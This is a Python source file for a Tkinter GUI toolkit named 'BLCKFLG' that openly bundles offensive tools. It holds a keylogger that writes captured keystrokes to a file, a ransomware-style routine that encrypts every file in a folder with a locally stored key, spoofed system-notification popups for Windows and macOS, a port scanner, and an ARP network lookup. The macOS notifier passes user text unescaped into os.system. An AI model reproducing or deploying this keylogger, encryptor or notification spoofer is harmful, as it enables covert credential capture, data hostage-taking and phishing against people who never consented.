from win10toast import ToastNotifier
from cryptography.fernet import Fernet
from tkinter import ttk
from tkinter import *
import ipaddress
import keyboard
import socket
import timeit 
import os
import re

'''
Creates a GUI interface
'''
m = Tk()
m.title('BLCKFLG')
m['bg'] = 'black'
m.geometry('400x400+500+100')
                
                
def serversupport():
    def client_program(port1):
        host = socket.gethostname()
        port = port1 

        client_socket = socket.socket() 
        client_socket.connect((host, port))
            
        client_socket.close()
        
        
    win= Tk()
    win.title('Server Support')
    win['bg'] = 'black'
    win.geometry("750x250")
        
    entry= Entry(win, width= 40)
    entry.pack()

    def change_value():
       value = 1
       value -= 1
       if value == 0:
           try:
                string = int(entry.get())
                client_program(string)
                value = 1
           except:
               print('write a valid ip address')

    ttk.Button(win, text= "confirm",width= 20, command= change_value).pack(pady=20)
    
    win.mainloop()

'''
Encryption Function
'''
def Encryption():
    random_key = Fernet.generate_key()
    
    folder_path = 'C:\\Test Folder'
    
    new_window('files Succesfully Encrypted')

    with open('thekey.key', 'wb') as thekey:
        thekey.write(random_key)

    for file in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file)

        with open(file_path, 'rb') as thefile:
            contents = thefile.read()
                
        encrypted_contents = Fernet(random_key).encrypt(contents)

        with open(file_path, 'wb') as thefile:
            thefile.write(encrypted_contents)

'''
Decryption Function
'''
def Decryption(key_file = 'thekey.key'):
    
    folder_path = 'C:\\Test Folder'

    new_window('files Succesfully Decrypted')

    with open(key_file, 'rb') as key_file:
        key = key_file.read()

    for file in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file)

        with open(file_path, 'rb') as thefile:
            contents = thefile.read()

        decrypted_contents = Fernet(key).decrypt(contents)

        with open(file_path, 'wb') as thefile:
            thefile.write(decrypted_contents)
    

'''
A Simple Keylogger
'''
def Keylogger():
            
    flag = 0
            
    while flag == 0:
        letters = keyboard.record()
        typed = list(keyboard.get_typed_strings(letters))
                
        file = open('E:\\keylogger.txt','a')
        file.write(typed[0])
        file.close
        if keyboard.is_pressed('escape'):
            flag += 1
            
def DelKeylogs():
    f = open('E:\\keylogger.txt','w')
    f.close()


'''
These Next three functions make a fake notification
'''

def Noti(Title,Body):
    toast = ToastNotifier()
    toast.show_toast(
    f"{Title}",
    f"{Body}",
    duration = 10,
    icon_path = "windows.ico",
    threaded = True,
)
    
def Notiweb():
    win= Tk()
    win.title('Things To Say')
    win['bg'] = 'black'
    win.geometry("750x250")
        
    
    entry= Entry(win, width= 40)
    entry.pack()

    entry2= Entry(win, width= 40)
    entry2.pack()
    
    def change_value():
       value = 1
       value -= 1
       if value == 0:
            string = entry.get()
            Body = entry2.get()
            Noti(string,Body)
            value = 1

    ttk.Button(win, text= "confirm",width= 20, command= change_value).pack(pady=20)
    
    win.mainloop()

'''
this makes the same thing but OSX 
'''

def Notiosx():
    win= Tk()
    win.title('Things To Say')
    win['bg'] = 'black'
    win.geometry("750x250")
        
    
    entry= Entry(win, width= 40)
    entry.pack()

    entry2= Entry(win, width= 40)
    entry2.pack()
    
    def change_value():
       value = 1
       value -= 1
       if value == 0:
            string = entry.get()
            Body = entry2.get()
            osxNoti(string, Body)
            value = 1

    ttk.Button(win, text= "confirm",width= 20, command= change_value).pack(pady=20)
    
    win.mainloop()
    
def osxNoti(text, title):
    os.system('''
              osascript -e 'display notification "{}" with title "{}"'
              '''.format(text, title))   
    
    
'''
Port Scanners
'''

def port():   
    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
    port_min = 0
    port_max = 65535

    open_ports = []
    while True:
        ip_add_entered = input("\nPlease enter the ip address that you want to scan: ")
        try:
            ip_address_obj = ipaddress.ip_address(ip_add_entered)
            print("You entered a valid ip address.")
            break
        except:
            print("You entered an invalid ip address")
        
    while True:
        print("Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
        port_range = input("Enter port range: ")
        port_range_valid = port_range_pattern.search(port_range.replace(" ",""))
        if port_range_valid:
            port_min = int(port_range_valid.group(1))
            port_max = int(port_range_valid.group(2))
            break

    for port in range(port_min, port_max + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                s.connect((ip_add_entered, port))
                open_ports.append(port)
        except:
            pass
        
        for port in open_ports:
            print(f"Port {port} is open on {ip_add_entered}.")

def search():
    print(os.system('arp -a'))

#                                                                                           #
#-------------------------------------GUI FOR SCRIPTS---------------------------------------#
#                                                                                           #

def openfile():
    f = open('E:\\keylogger.txt','r')
    read = f.read()
    nwp = Toplevel(m)
    nwp.title('Keylogs')
    nwp['bg'] = 'black'
    nwp.geometry('1080x540')
    Label(nwp, text=str(read),font=('Ariel 15 bold')).pack(pady=30)    
    f.close()
    
def new_window(textstring):
    nwp = Toplevel(m)
    nwp.title('Key')
    nwp['bg'] = 'black'
    nwp.geometry('540x540')
    Label(nwp, text=str(textstring),font=('Ariel 15 bold')).pack(pady=30)
    
#------------------------------------GUI BUTTONS--------------------------------------#

#Keylogger Button
button1 = Button(m,text = 'Keylogger', command = Keylogger)
button1.pack()

#Keylogger file button
button2 = Button(m, text = 'Open Keylogs', command = openfile)
button2.pack()
         
#Delete what is in Keylogger Button        
button7 = Button(m,text = 'DelKeylogger', command = DelKeylogs)
button7.pack()

#Decryption button          
button3 = Button(m,text= 'Decryptor', command = Decryption)
button3.pack(side = 'bottom')    
       
#Encryption button
button4 = Button(m, text = 'Encryptor', command = Encryption)
button4.pack(side = 'bottom')

#Fake Notification Button
button5 = Button(m, text = 'Fake Notification', command = Notiweb)
button5.pack(side = 'left')

#Same as above ^^^^^^^^ but osx
button8 = Button(m, text = 'Fake Notification OSX', command = Notiosx)
button8.pack()
button8.place(x=-0,y=174)

#Port scanner Button
button6 = Button(m, text = 'Port Scanner', command = port)
button6.pack(side = 'right')

#server support button
button9 = Button(text='Search Network', command= search)
button9.place(relx=0.5, rely=0.5, anchor = 'center')

m.mainloop()